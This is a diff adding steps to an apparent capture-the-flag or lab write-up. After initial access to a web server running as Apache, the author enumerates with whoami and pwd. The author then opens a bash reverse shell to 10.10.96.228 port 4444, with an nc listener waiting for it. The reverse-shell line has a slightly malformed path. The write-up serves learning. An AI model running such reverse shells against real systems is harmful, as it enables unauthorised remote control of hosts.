@@ -53,3 +53,31 @@
   ### Step 3: Exploring Initial Access
 
   - I ran the command "whoami" to discover who I was logged into.
+      ``` bash
+      whoami
+      ```
+    - Results: Apache
+
+    - I ran the command "pwd" to discover where I was located within the file directories.
+      ``` bash
+      pwd
+      ```
+        - Results: /data/www/default
+
+        - I attempted to change directories by using "cd /home"
+          ``` bash
+          cd /home
+          ```
+            - Results: Deprecated connection. This means that the shell we are using is unstable.
+    
+    - I then tried to set up a reverse shell to hopefully have access to a more stable shell.
+      ``` bash
+      bash -c 'exec bash -i &> dev/tcp/10.10.96.228/4444 <&1'
+      ```
+      
+        - Before executing the reverse shell command, I opened another terminal to set up a listener on port 4444.
+          ``` bash
+          nc -lvnp 4444
+          ```
+
+          - Executed the reverse shell command.
